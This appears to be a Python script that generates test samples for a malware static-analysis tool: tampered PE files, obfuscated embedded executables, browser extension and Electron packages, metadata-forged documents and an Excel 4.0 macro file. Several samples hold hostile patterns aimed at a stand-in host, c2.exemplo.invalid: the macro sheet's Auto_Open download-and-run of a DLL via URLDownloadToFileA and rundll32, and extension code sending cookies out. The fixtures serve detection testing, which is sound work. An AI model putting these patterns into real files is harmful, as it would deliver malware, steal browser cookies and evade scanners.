"""Variantes dos PEs de teste (item 7.1): Rich header, checksum, overlay e UPX disfarcado."""
import hashlib
import io
import json
import shutil
import struct
import sys
import zipfile

import pefile

W = sys.argv[1]


def rol(v, n):
    n &= 31
    return ((v << n) | (v >> (32 - n))) & 0xFFFFFFFF if n else v


def with_rich(src, dst, entries, forge=False):
    """Insere um Rich header (como o do MSVC) no stub DOS, deslocando os cabecalhos NT."""
    data = bytearray(open(src, 'rb').read())
    old = struct.unpack_from('<I', data, 0x3C)[0]
    pe = pefile.PE(data=bytes(data), fast_load=True)
    end = pe.sections[-1].get_file_offset() + 40
    rich_len = 16 + 8 * len(entries) + 8
    new = (0x80 + rich_len + 15) & ~15
    shift = new - old
    assert end + shift <= pe.OPTIONAL_HEADER.SizeOfHeaders, 'sem espaco nos cabecalhos'
    assert end + shift <= min(s.PointerToRawData for s in pe.sections if s.PointerToRawData)
    headers = bytes(data[old:end])
    data[old:end] = b'\0' * (end - old)
    data[new:new + len(headers)] = headers
    struct.pack_into('<I', data, 0x3C, new)
    # Chave do MSVC: soma rotacionada do cabecalho DOS (sem o e_lfanew) e dos comp ids.
    key = 0x80
    for i in range(0x80):
        if 0x3C <= i < 0x40:
            continue
        key = (key + rol(data[i], i)) & 0xFFFFFFFF
    for compid, count in entries:
        key = (key + rol(compid, count)) & 0xFFFFFFFF
    stored = entries if not forge else [(c, n + 1) for c, n in entries]
    rich = struct.pack('<4I', 0x536E6144 ^ key, key, key, key)
    for compid, count in stored:
        rich += struct.pack('<2I', compid ^ key, count ^ key)
    rich += b'Rich' + struct.pack('<I', key)
    data[0x80:0x80 + len(rich)] = rich
    open(dst, 'wb').write(bytes(data))


ENTRIES = [
    (0x0105 << 16 | 30795, 12),  # Utc1900_C
    (0x0104 << 16 | 30795, 3),  # Utc1900_CPP
    (0x0103 << 16 | 30795, 7),  # Masm1400
    (0x0001 << 16 | 0, 98),  # Import0
    (0x0102 << 16 | 30795, 1),  # Linker1400
]
with_rich(f'{W}/prog64.exe', f'{W}/rich.exe', ENTRIES)
with_rich(f'{W}/prog64.exe', f'{W}/rich-forjado.exe', ENTRIES, forge=True)

# Checksum certo e errado (o mingw grava 0, que nao se confere).
pe = pefile.PE(f'{W}/prog64.exe')
pe.OPTIONAL_HEADER.CheckSum = pe.generate_checksum()
pe.write(f'{W}/checksum-ok.exe')
pe.OPTIONAL_HEADER.CheckSum = pe.OPTIONAL_HEADER.CheckSum + 1
pe.write(f'{W}/checksum-errado.exe')

# Overlay: um ZIP depois da ultima secao, como num instalador ou dropper.
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr('leia.txt', 'conteudo anexado ' * 50)
open(f'{W}/overlay.exe', 'wb').write(open(f'{W}/prog64.exe', 'rb').read() + buf.getvalue())

# UPX disfarcado: secoes renomeadas e a marca UPX! apagada; sobra o codigo do entry point.
# O de 32 bits (item 17): o unipacker so emula PE32.
for src, dst in [('upx64.exe', 'upx-disfarcado.exe'), ('upx32.exe', 'upx32-disfarcado.exe')]:
    data = bytearray(open(f'{W}/{src}', 'rb').read())
    pe = pefile.PE(data=bytes(data))
    for sec, name in zip(pe.sections, [b'.text', b'.data', b'.rsrc', b'.idata']):
        off = sec.get_file_offset()
        data[off:off + 8] = name.ljust(8, b'\0')
    head = min(s.PointerToRawData for s in pe.sections if s.PointerToRawData) + 0x1000
    i = data.find(b'UPX!')
    while 0 <= i < head:
        data[i:i + 4] = b'\0\0\0\0'
        i = data.find(b'UPX!', i + 4)
    open(f'{W}/{dst}', 'wb').write(bytes(data))

# Assinado e depois adulterado: um byte do codigo trocado.
data = bytearray(open(f'{W}/assinado.exe', 'rb').read())
pe = pefile.PE(data=bytes(data), fast_load=True)
text = pe.sections[0]
mid = text.PointerToRawData + text.SizeOfRawData // 2
data[mid] ^= 0xFF
open(f'{W}/adulterado.exe', 'wb').write(bytes(data))
# Diretorio de debug (plans/analise-estatica-ampliada, item 1): datas coerentes no pdb.exe; no
# timestomp, so o cabecalho muda (como faz quem forja a data); no repro, a entrada vira REPRO e o
# cabecalho ganha um "hash" que, lido como data, cai no futuro.
# O ld grava so o nome do PDB; o link.exe grava o caminho inteiro. O registro CodeView e regravado
# com o caminho completo, no espaco que sobra na secao .buildid (512 bytes no arquivo).
pe = pefile.PE(f'{W}/pdb.exe')
dbg = pe.DIRECTORY_ENTRY_DEBUG[0].struct
data = bytearray(pe.__data__)
cv = data[dbg.PointerToRawData:dbg.PointerToRawData + 24]
assert cv[:4] == b'RSDS'
path = rb'C:\Users\joao\source\repos\Ladrao\obj\Release\Ladrao.pdb'
record = bytes(cv) + path + b'\0'
sec = next(s for s in pe.sections if s.contains_rva(dbg.AddressOfRawData))
used = dbg.AddressOfRawData - sec.VirtualAddress + len(record)
assert used <= sec.SizeOfRawData
data[dbg.PointerToRawData:dbg.PointerToRawData + len(record)] = record
open(f'{W}/pdb.exe', 'wb').write(bytes(data))
pe = pefile.PE(f'{W}/pdb.exe')
dbg = pe.DIRECTORY_ENTRY_DEBUG[0].struct
dbg.SizeOfData = len(record)
sec = next(s for s in pe.sections if s.contains_rva(dbg.AddressOfRawData))
sec.Misc_VirtualSize = max(sec.Misc_VirtualSize, used)
pe.FILE_HEADER.TimeDateStamp = 1700000000
dbg.TimeDateStamp = 1700000000
pe.write(f'{W}/pdb.exe')
pe.FILE_HEADER.TimeDateStamp = 1500000000
pe.write(f'{W}/pdb-timestomp.exe')
pe.FILE_HEADER.TimeDateStamp = 4102444800
dbg.Type = 16
pe.write(f'{W}/pdb-repro.exe')
print('post ok')


# Carving e forca bruta (item 18). Bytes "aleatorios" deterministicos: o hash encadeado.
def filler(n, seed):
    out, h = b'', seed
    while len(out) < n:
        h = hashlib.sha256(h).digest()
        out += h
    return out[:n]


def xor_key(buf, key, at):
    return bytes(b ^ key[(at + i) % len(key)] for i, b in enumerate(buf))


def rol3(buf):
    return bytes(((b << 3) | (b >> 5)) & 0xFF for b in buf)


prog32 = open(f'{W}/prog32.exe', 'rb').read()
url = b'\0\0https://c2.exemplo.invalid/gate.php?id=7\0\0'
# Arquivo sem tipo: o PE com XOR 0x5a e a URL com ROL 3.
head = filler(777, b'xor-solto')
open(f'{W}/xor-solto.bin', 'wb').write(head + xor_key(prog32, b'\x5a', 0) + filler(100, b'meio') + rol3(url))
# Executavel com o PE anexado com XOR de 4 bytes (alinhado a posicao no arquivo).
prog64 = open(f'{W}/prog64.exe', 'rb').read()
at = len(prog64) + 64
open(f'{W}/xor4-dropper.exe', 'wb').write(
    prog64 + filler(64, b'pad') + xor_key(prog32, b'\x11\x22\x33\x44', at)
)
# Arquivo sem tipo com o PE em claro no meio (o binwalk acha).
open(f'{W}/embutido.bin', 'wb').write(filler(1000, b'embutido') + prog32 + filler(500, b'fim'))


# Pacotes da web (item 20): ASAR do Electron, extensao do Chrome (CRX3) e do Firefox (XPI).
def asar(entries):
    tree, blobs, offset = {'files': {}}, b'', 0
    for path, data in entries:
        node = tree
        parts = path.split('/')
        for part in parts[:-1]:
            node = node['files'].setdefault(part, {'files': {}})
        node['files'][parts[-1]] = {'size': len(data), 'offset': str(offset)}
        blobs += data
        offset += len(data)
    raw = json.dumps(tree, separators=(',', ':')).encode()
    padded = raw + b'\0' * (-len(raw) % 4)
    payload = struct.pack('<I', len(raw)) + padded
    header = struct.pack('<I', len(payload)) + payload
    return struct.pack('<II', 4, len(header)) + header + blobs


open(f'{W}/app.asar', 'wb').write(asar([
    ('package.json', b'{"name":"carteira","version":"2.1.0","main":"main.js"}'),
    ('main.js', b'const { app } = require("electron");\nrequire("./lib/rede.js");\n'),
    ('lib/rede.js', b'fetch("https://c2.exemplo.invalid/coleta", { method: "POST" });\n'),
    ('node_modules/leftpad/index.js', b'module.exports = (s) => s;\n'),
    ('build/nativo.node', open(f'{W}/teste.dll', 'rb').read()),
    ('assets/logo.png', b'\x89PNG\r\n\x1a\n' + b'\0' * 64),
]))


def zip_of(entries):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        for name, data in entries:
            # O manifesto sem compressao: o tipo XPI e reconhecido pelo texto "gecko" nele.
            z.writestr(name, data, zipfile.ZIP_STORED if name == 'manifest.json' else zipfile.ZIP_DEFLATED)
    return buf.getvalue()


chrome = zip_of([
    ('manifest.json', json.dumps({
        'manifest_version': 3, 'name': 'Cupons Rapidos', 'version': '1.4',
        'permissions': ['cookies', 'scripting', 'storage'],
        'host_permissions': ['<all_urls>'],
        'content_scripts': [{'matches': ['https://*.banco.example/*'], 'js': ['injeta.js']}],
        'background': {'service_worker': 'fundo.js'},
        'update_url': 'https://atualiza.exemplo.invalid/crx.xml',
    }).encode()),
    ('injeta.js', b'document.querySelector("form").addEventListener("submit", () => {});\n'),
    ('fundo.js', b'chrome.cookies.getAll({}, (c) => fetch("https://c2.exemplo.invalid/c"));\n'),
    ('icone.png', b'\x89PNG\r\n\x1a\n' + b'\0' * 64),
])
proto = b'\x12\x10' + bytes(range(16))  # cabecalho CRX3 (protobuf) qualquer: o leitor so pula
open(f'{W}/extensao.crx', 'wb').write(b'Cr24' + struct.pack('<II', 3, len(proto)) + proto + chrome)
open(f'{W}/extensao.xpi', 'wb').write(zip_of([
    ('manifest.json', json.dumps({
        'manifest_version': 2, 'name': 'Bloqueador', 'version': '0.9',
        'permissions': ['webRequest', 'webRequestBlocking', '<all_urls>', 'storage'],
        'background': {'scripts': ['bg.js']},
        'browser_specific_settings': {'gecko': {'id': 'bloqueador@exemplo.invalid'}},
    }).encode()),
    ('bg.js', b'browser.webRequest.onBeforeRequest.addListener(() => {}, { urls: ["<all_urls>"] });\n'),
]))


# Metadados (item 19): um DOCX com autor, "modificado por" e datas trocadas (modificado antes de
# criado), e dois PDFs diferentes com o mesmo DocumentID do XMP (o mesmo modelo).
CORE = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
 xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<dc:creator>Joao Golpista</dc:creator><cp:lastModifiedBy>Operador 7</cp:lastModifiedBy>
<dcterms:created xsi:type="dcterms:W3CDTF">2026-05-10T10:00:00Z</dcterms:created>
<dcterms:modified xsi:type="dcterms:W3CDTF">2026-01-01T08:00:00Z</dcterms:modified>
</cp:coreProperties>"""
APP = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties">
<Application>Microsoft Office Word</Application><Company>Fatura Facil Ltda</Company></Properties>"""
TYPES = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
<Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
<Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/>
</Types>"""
RELS = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>
<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties" Target="docProps/app.xml"/>
</Relationships>"""
DOC = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Fatura</w:t></w:r></w:p></w:body></w:document>"""
with zipfile.ZipFile(f'{W}/metadados.docx', 'w', zipfile.ZIP_DEFLATED) as z:
    for name, body in [('[Content_Types].xml', TYPES), ('_rels/.rels', RELS), ('word/document.xml', DOC),
                       ('docProps/core.xml', CORE), ('docProps/app.xml', APP)]:
        z.writestr(name, body)


def pdf_with_xmp(title):
    xmp = f"""<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="" xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/" xmlns:xmp="http://ns.adobe.com/xap/1.0/">
<xmpMM:DocumentID>uuid:6f1c2a9e-0b7d-4c55-9f3e-2d8a7b1c0e44</xmpMM:DocumentID>
<xmpMM:InstanceID>uuid:{hashlib.sha256(title.encode()).hexdigest()[:32]}</xmpMM:InstanceID>
<xmp:CreatorTool>FabricaDeFaturas 3.1</xmp:CreatorTool>
</rdf:Description></rdf:RDF></x:xmpmeta>
<?xpacket end="w"?>""".encode()
    objs = [
        b'<< /Type /Catalog /Pages 2 0 R /Metadata 4 0 R >>',
        b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
        b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>',
        b'<< /Type /Metadata /Subtype /XML /Length ' + str(len(xmp)).encode() + b' >>\nstream\n' + xmp + b'\nendstream',
        b'<< /Title (' + title.encode() + b') /Producer (FabricaDeFaturas 3.1) /Author (Setor Financeiro) >>',
    ]
    out, offsets = b'%PDF-1.7\n', []
    for i, body in enumerate(objs, 1):
        offsets.append(len(out))
        out += f'{i} 0 obj\n'.encode() + body + b'\nendobj\n'
    xref = len(out)
    out += f'xref\n0 {len(objs) + 1}\n0000000000 65535 f \n'.encode()
    out += b''.join(f'{o:010d} 00000 n \n'.encode() for o in offsets)
    out += f'trailer\n<< /Size {len(objs) + 1} /Root 1 0 R /Info 5 0 R >>\nstartxref\n{xref}\n%%EOF\n'.encode()
    return out


open(f'{W}/modelo-a.pdf', 'wb').write(pdf_with_xmp('Fatura 001'))
open(f'{W}/modelo-b.pdf', 'wb').write(pdf_with_xmp('Fatura 002'))


# XLM 4.0 (item 21): uma planilha com folha de macro do Excel 4, Auto_Open e a URL montada com
# CHAR(104) & ..., que so aparece inteira depois da emulacao.
XT = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
XLSM = {
 '[Content_Types].xml': XT + '''<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
<Override PartName="/xl/macrosheets/sheet2.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>
</Types>''',
 '_rels/.rels': XT + '''<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>''',
 'xl/workbook.xml': XT + '''<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<sheets><sheet name="Fatura" sheetId="1" r:id="rId1"/><sheet name="Macro1" sheetId="2" r:id="rId2"/></sheets>
<definedNames><definedName name="_xlnm.Auto_Open" hidden="1">Macro1!$A$1</definedName></definedNames>
</workbook>''',
 'xl/_rels/workbook.xml.rels': XT + '''<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
<Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet2.xml"/>
</Relationships>''',
 'xl/worksheets/sheet1.xml': XT + '''<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData/></worksheet>''',
 'xl/macrosheets/sheet2.xml': XT + '''<xm:macrosheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main">
<sheetData>
<row r="1"><c r="A1"><f>CHAR(104)&amp;"ttps://c2.exemplo.invalid/"&amp;"x.dll"</f></c></row>
<row r="2"><c r="A2"><f>CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,A1,"C:\\Users\\Public\\x.dll",0,0)</f></c></row>
<row r="3"><c r="A3"><f>EXEC("rundll32 C:\\Users\\Public\\x.dll,Iniciar")</f></c></row>
<row r="4"><c r="A4"><f>HALT()</f></c></row>
</sheetData></xm:macrosheet>''',
}
with zipfile.ZipFile(f'{W}/xlm.xlsm', 'w', zipfile.ZIP_DEFLATED) as z:
    for n, b in XLSM.items():
        z.writestr(n, b)
